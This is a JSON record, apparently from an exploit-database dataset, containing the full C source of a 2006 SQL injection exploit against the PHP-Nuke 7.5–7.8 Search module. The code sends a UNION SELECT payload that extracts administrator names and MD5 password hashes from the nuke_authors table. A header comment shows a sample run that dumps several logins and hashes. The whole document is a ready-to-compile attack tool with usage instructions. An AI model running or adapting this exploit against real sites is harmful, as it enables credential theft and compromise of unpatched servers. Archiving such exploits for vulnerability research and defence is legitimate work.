{
  "id": "1523",
  "title": "PHP-Nuke 7.5 &lt; 7.8 - &#039;Search&#039; SQL Injection",
  "cve": null,
  "vuln_type": "sqli",
  "code": "/*\r\n                  ____   ____    __\r\n|    |     |     |    | |    |  /\r\n|    |     |     |    | |___/   \\\r\n|    | --- |     |----| |   \\    \\\r\n|____|     |____ |    | |____| __/\r\n\r\nCopyright (C) 2006 Untruth Labs\r\n\r\nCritical sql injection in phpNuke 7.5-7.8 Exploit\r\ncoded by unitedbr\r\n\r\ngreetz: paulin, barros, xgc\r\n\r\nfound by Janek Vind \"waraxe\"\r\nOriginal advisory: http://www.waraxe.us/advisory-46.html\r\n\r\n-------------------------------------------------------------------------------\r\n\r\ncompiled in VC++\r\n\r\nC:\\@Pastinha\\Area_de_Testes\\cpp\\phpnuke75to78>cl phpnuke75to78.cpp\r\nMicrosoft (R) 32-bit C/C++ Optimizing Compiler Version 12.00.8168 for 80x86\r\nCopyright (C) Microsoft Corp 1984-1998. All rights reserved.\r\n\r\nphpnuke75to78.cpp\r\nMicrosoft (R) Incremental Linker Version 6.00.8168\r\nCopyright (C) Microsoft Corp 1992-1998. All rights reserved.\r\n\r\n/out:phpnuke75to78.exe\r\nphpnuke75to78.obj\r\n\r\nC:\\@Pastinha\\Area_de_Testes\\cpp\\phpnuke75to78>\r\n\r\n-------------------------------------------------------------------------------\r\n\r\nExploit:\r\n\r\nC:\\@Pastinha\\Area_de_Testes\\cpp\\phpnuke75to78>phpnuke75to78 127.0.0.1 /phpnuke75to78/\r\n                  ____   ____    __\r\n|    |     |     |    | |    |  /\r\n|    |     |     |    | |___/   \\\r\n|    | --- |     |----| |   \\    \\\r\n|____|     |____ |    | |____| __/\r\n\r\n\r\n[~] Sending sql injection...\r\n[~] Connected and exploiting...\r\n[~] Trying to get the md5 passwords...\r\n\r\n\r\n--[ md5 hash passwords\r\n\r\nlogin: unitedbr\r\nmd5 password: 85a2b752c8686ac935765bb8f2c10fe7\r\n\r\nlogin: psy0x\r\nmd5 password: 75d690bc3c8598371af11bf1796696f0\r\n\r\nlogin: paulin\r\nmd5 password: 2bdfb3cbc500bcc4ea4e6a524487eb4c\r\n\r\nlogin: poerschke\r\nmd5 password: 5dab98907b1d8db82172944c52404fcd\r\n\r\nlogin: uNfz\r\nmd5 password: 254fa93505554fbfee98d018fd80803a\r\n\r\nlogin: Coloss\r\nmd5 password: a89de668ffb6504172a7df7e2abce403\r\n\r\nlogin: skotch\r\nmd5 password: 0ef9fb24ae1af6d0a397dc60dc0f87d2\r\n\r\nC:\\@Pastinha\\Area_de_Testes\\cpp\\phpnuke75to78>\r\n\r\n\r\n*/\r\n\r\n#include <string.h>\r\n#include <stdlib.h>\r\n#include <stdio.h>\r\n#pragma comment(lib, \"ws2_32.lib\")\r\n#include <winsock2.h>\r\n\r\n#define PORT 80\r\n#define BUFLEN 10000\r\n#define DATA \"query=p0hh0nsee%') UNION ALL SELECT 1,2,aid,pwd,5,6,7,8,9,10 FROM nuke_authors/*\" // */ */\r\n#define U \"                  ____   ____    __ \\n\"\r\n#define L \"|    |     |     |    | |    |  /   \\n\"\r\n#define A \"|    |     |     |    | |___/   \\\\   \\n\"\r\n#define B \"|    | --- |     |----| |   \\\\    \\\\ \\n\"\r\n#define S \"|____|     |____ |    | |____| __/  \\n\\n\"\r\n\r\nvoid usage(char *argv[]);\r\nvoid sqlinj(char *host, char *dir);\r\nchar *md5pass(char *buffer, char *s, bool test);\r\n\r\nint main(int argc, char *argv[])\r\n{   \r\n     if( argc != 3 )\r\n     {\r\n         usage(argv);\r\n         exit(EXIT_FAILURE);\r\n     }\r\n     \r\n     printf(U L A B S);\r\n     printf(\"\\n\");\r\n     printf(\"[~] Sending sql injection...\\n\");\r\n     sqlinj(argv[1], argv[2]);\r\n    \r\n     return 0;\r\n}\r\n\r\nvoid usage(char *argv[])\r\n{\r\n     printf(\"\\n##############################################\\n\");\r\n     printf(\"#                                            #\\n\");\r\n     printf(\"#             [ Untruth Labs ]               #\\n\");\r\n     printf(\"#                                            #\\n\");\r\n     printf(\"#                 presents                   #\\n\");\r\n     printf(\"#                                            #\\n\");\r\n     printf(\"#     PHP-Nuke 7.5 to 7.8 sql injection      #\\n\");\r\n     printf(\"#                                            #\\n\");\r\n     printf(\"#                          coded by unitedbr #\\n\");\r\n     printf(\"##############################################\\n\\n\");\r\n     printf(\"Usage:\\n\"\r\n            \"%s [target] [dir]\\n\\n\"\r\n            \"Example:\\n\"\r\n            \"%s www.target.com /dir/\\n\"\r\n            \"%s www.target.com /\\n\", argv[0], argv[0], argv[0]);\r\n\r\n     exit(EXIT_SUCCESS);\r\n}\r\n\r\nvoid sqlinj(char *host, char *dir)\r\n{\r\n     char buffer[BUFLEN];\r\n     sprintf( buffer, \"POST %smodules.php?name=Search HTTP/1.0\\n\"\r\n                      \"Host: %s\\n\"\r\n                      \"Content-Type: application/x-www-form-urlencoded\\n\"\r\n                      \"Content-Length: %d\\n\\n%s\\n\\n\\n\", dir, host, strlen(DATA), DATA);\r\n     \r\n     WSADATA wsaData;\r\n    \r\n     /* Winsock start up */\r\n     int iResult = WSAStartup( MAKEWORD(2,2), &wsaData );\r\n     if ( iResult != NO_ERROR )\r\n     {\r\n          printf(\"\\n[-] Error at WSAStartup()\\n\");\r\n          exit(EXIT_FAILURE);\r\n     }\r\n     \r\n     /* Create socket */\r\n     SOCKET my_sock;\r\n     my_sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );\r\n    \r\n     if( my_sock == INVALID_SOCKET )\r\n     {\r\n         printf(\"\\n[-] Error creating socket: %ld\\n\", WSAGetLastError() );\r\n         WSACleanup();\r\n         exit(EXIT_FAILURE);\r\n     }\r\n    \r\n     struct hostent *he;\r\n     struct sockaddr_in addr;\r\n    \r\n     /* getting the ip address */\r\n     he = gethostbyname(host);\r\n     if( he == NULL )\r\n     {\r\n         printf(\"\\n[-] Can't resolve ip address \\\"%s\\\"\\n\", host);\r\n         exit(EXIT_FAILURE);\r\n     }\r\n    \r\n     memset(&addr, 0, sizeof(addr));\r\n     memcpy((char*)&addr.sin_addr, he->h_addr, he->h_length);\r\n     addr.sin_family = AF_INET;\r\n     addr.sin_port = htons(PORT);\r\n    \r\n     /* connecting */\r\n     if( connect(my_sock, (struct sockaddr *)&addr, sizeof(addr)) < 0)\r\n     {\r\n          printf(\"\\n[-] Can't connect to %s\\n\", host);\r\n          WSACleanup();\r\n          exit(EXIT_FAILURE);\r\n     }\r\n     \r\n     printf(\"[~] Connected and exploiting...\\n\");\r\n     \r\n     if( send(my_sock, buffer, sizeof(buffer), 0) < 0 )\r\n     {\r\n          printf(\"\\n[-] Can't send socket...\\n\");\r\n          exit(EXIT_FAILURE);\r\n     }\r\n     \r\n     memset(buffer,0, sizeof(buffer));\r\n     \r\n     char *s = NULL;\r\n     bool test = false, onetime = true;\r\n     \r\n     printf(\"[~] Trying to get the md5 passwords...\\n\\n\");\r\n\r\n     while( recv(my_sock, buffer, sizeof(buffer), 0) )\r\n     {\r\n         while( (s = strstr(buffer, \"article&sid=1\\\"><b>\")) != NULL )\r\n         {\r\n             test = true;\r\n             s = md5pass(buffer, s, onetime);\r\n             onetime = false;\r\n         }\r\n     }\r\n     \r\n     if(!test)\r\n         printf(\"Oooopz... Can't find md5 passwords :\\\\\\n\");\r\n     \r\n     WSACleanup();\r\n     closesocket(my_sock);\r\n}\r\n\r\nchar *md5pass(char *buffer, char *s, bool onetime)\r\n{\r\n     int pos = 0, pos1 = 0, pos2 = 0;\r\n     int i = 0, j = 0;\r\n     char *str = NULL;\r\n     \r\n     if(onetime)\r\n         printf(\"\\n--[ md5 hash passwords\\n\\n\");\r\n     \r\n     if( (s = strstr(buffer, \"amp;username=\")) != NULL )\r\n     {\r\n         if( (str = strstr(s, \"\\\">\")) != NULL )\r\n         {\r\n             pos1 = str - s + 1;\r\n         }\r\n         printf(\"login: \");\r\n         for(i = 13; i < pos1-1; i++)\r\n         {\r\n             printf(\"%c\", s[i]);\r\n         }\r\n             \r\n         printf(\"\\n\");\r\n     }\r\n     if( (s = strstr(buffer, \"article&sid=1\\\"><b>\")) != NULL )\r\n     {\r\n         if( (str = strstr(s, \"</b>\")) != NULL )\r\n         {\r\n             pos2 = str - s + 1;\r\n         }\r\n         printf(\"md5 password: \");\r\n         for(i = 18; i < pos2-1; i++)\r\n         {\r\n             printf(\"%c\", s[i]);\r\n         }\r\n             \r\n         printf(\"\\n\\n\");\r\n     }\r\n     \r\n     //printf(\"\\npos2 = %d\\n\", pos2);\r\n     \r\n     for(i = 0, j = 260; s[i] != NULL; i++, j++)\r\n     {\r\n         s[i] = s[j];\r\n     }\r\n             \r\n     return s;\r\n}\r\n\r\n// milw0rm.com [2006-02-23]",
  "url": "https://www.exploit-db.com/exploits/1523"
}